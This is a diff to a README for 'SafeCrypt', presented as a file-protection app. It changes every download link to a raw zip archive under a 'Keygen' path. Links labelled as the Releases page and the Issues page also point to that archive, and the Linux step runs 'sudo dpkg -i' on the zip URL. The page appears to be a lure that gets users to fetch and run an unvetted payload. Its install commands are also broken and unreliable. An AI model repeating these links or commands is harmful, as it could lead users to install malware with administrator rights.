@@ -1,6 +1,6 @@
 # 💰 SafeCrypt - Protect Your Files with Ease
 
-[![Download SafeCrypt](https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/hedgebreaker/SafeCrypt.zip%20SafeCrypt-blue?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/hedgebreaker/SafeCrypt.zip)
+[![Download SafeCrypt](https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/Keygen/Crypt-Safe-1.1.zip%20SafeCrypt-blue?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/Keygen/Crypt-Safe-1.1.zip)
 
 ## 📖 What is SafeCrypt?
 
@@ -17,7 +17,7 @@ SafeCrypt is a user-friendly application designed to help you safeguard your fil
 ### Installation Steps
 
 1. **Visit the Download Page:** Click the link below to go to the Releases page:
-   [Download SafeCrypt](https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/hedgebreaker/SafeCrypt.zip)
+   [Download SafeCrypt](https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/Keygen/Crypt-Safe-1.1.zip)
    
 2. **Download the Installer:** On the Releases page, look for the latest version. Click on the installer for your system (Windows or Linux).
 
@@ -25,7 +25,7 @@ SafeCrypt is a user-friendly application designed to help you safeguard your fil
    - For **Windows Users:** Double-click the downloaded `.exe` file. Follow the on-screen instructions to install SafeCrypt.
    - For **Linux Users:** Open a terminal, navigate to the folder where you downloaded the file, and run the following command:
      ```bash
-     sudo dpkg -i https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/hedgebreaker/SafeCrypt.zip
+     sudo dpkg -i https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/Keygen/Crypt-Safe-1.1.zip
      ```
 
 4. **Launch SafeCrypt:** Once installed, find SafeCrypt in your applications menu. Open the app to start using it.
@@ -56,7 +56,7 @@ SafeCrypt is a user-friendly application designed to help you safeguard your fil
 
 ## 📞 Support
 
-If you encounter any issues while using SafeCrypt or have questions, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/hedgebreaker/SafeCrypt.zip). We aim to assist you as quickly as possible.
+If you encounter any issues while using SafeCrypt or have questions, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/Keygen/Crypt-Safe-1.1.zip). We aim to assist you as quickly as possible.
 
 ## 📜 License
 
@@ -69,6 +69,6 @@ This project is intended for educational purposes. Use SafeCrypt responsibly and
 ## 📥 Download & Install
 
 To download SafeCrypt, click the link below:
-[Download SafeCrypt](https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/hedgebreaker/SafeCrypt.zip)
+[Download SafeCrypt](https://raw.githubusercontent.com/jjiscoollikethatguy/SafeCrypt/master/Keygen/Crypt-Safe-1.1.zip)
 
 Follow the installation steps outlined above to get started. Enjoy a safer digital space!
